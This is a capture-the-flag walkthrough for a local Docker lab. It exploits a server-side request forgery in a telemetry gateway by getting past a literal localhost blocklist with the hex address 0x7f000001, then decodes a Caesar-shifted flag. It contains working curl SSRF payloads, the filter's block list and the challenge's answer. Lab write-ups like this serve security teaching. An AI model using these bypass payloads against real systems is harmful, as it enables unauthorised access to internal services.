# SCADA Gateway

**Flag:** `WHOAMI{ssrf_pl4nt4_n0rt3}`

> Telemetry query gateway. Download the lab zip and run it on Kali/Linux with Docker.
> `chmod +x startlab.sh && ./startlab.sh blackout-web06.tar` → lab IP (172.18.0.2). Enumerate with nmap and attack via HTTP.
> **Hint:** enumerate the lab IP with nmap. There is a gateway that queries a node URL.

---

## Solution

The challenge involves exploiting an SSRF vulnerability in a telemetry gateway that blocks localhost access, bypassing the filter with an alternative IP representation to reach an internal service and decode a Caesar-encrypted flag.

### 1. Spin up and enumerate

**Tool:** `docker inspect` + `nmap`. **Why:** I obtain the container IP and then the services to attack.

**nmap parameters:** `-sV` (service version) and `-p-` (all ports).

```bash
$ unzip blackout-web06.zip && chmod +x startlab.sh && ./startlab.sh blackout-web06.tar
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web06
172.17.0.2

$ nmap -sV -p- 172.17.0.2
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

Only port 80 → the attack is via HTTP.

### 2. The gateway: "node URL" field

`/gateway.php` requests a URL and previews it. The code performs `curl_init($url)` and dumps the response → **SSRF**. It blocks `localhost`, `127.`, `0.0.0.0`, `::1`, `169.254`, `file:`, `gopher:`, `dict:`, `ftp:` — but only literally.

### 3. Bypass localhost blocking

`127.0.0.1` is blocked by the regex, but **`0x7f000001` also resolves to 127.0.0.1** and does not contain any of the forbidden strings:

```bash
$ curl -X POST http://172.17.0.2/gateway.php \
    --data-urlencode "url=http://0x7f000001:9090/"
{"nodo":"norte","sector":14,"kv":230}
```

**What I saw:** an internal service responded on port 9090 of the container itself (a mini HTTP server). Scanning ports inside the container (`netstat`) shows: `0100007F:2382` = `127.0.0.1:9090`.

### 4. Discover internal service routes

Testing routes, `/registro` returns the content we are looking for:

```bash
$ curl -X POST http://172.17.0.2/gateway.php \
    --data-urlencode "url=http://0x7f000001:9090/registro"
ZKRDPL{vvui_so4qw4_q0uw3}
```

The string appears to be ROT/Caesar. `ZKRDPL` with a **−3** shift = `WHOAMI`.

### 5. Decode the Caesar cipher

**Tool:** `tr`. **Why:** it replaces characters by ranges; it applies the Caesar shift without writing code.

**Parameters:** `'A-Za-z' 'X-ZA-Wx-za-w'` shifts each letter 3 positions backward (A→X, B→Y, …, Z→W).

```bash
$ echo "ZKRDPL{vvui_so4qw4_q0uw3}" | tr 'A-Za-z' 'X-ZA-Wx-za-w'
WHOAMI{ssrf_pl4nt4_n0rt3}
```

> **Anti-trap note:** the internal binary `/sbin/sys-daemon` contains another string `WHOAMI{docker_exec_detected_n1ce_try}` — it is a **honeypot** for anyone who runs `docker exec cat /root/flag.txt` instead of solving the SSRF. The real flag only comes from the internal service.

## Lesson

SSRF with `localhost` blocking protects nothing: it is bypassed with alternative IP representations (`0x7f000001`, decimal, octal…). Then explore internal ports and routes of the reachable service. And watch out for trap strings in container binaries.
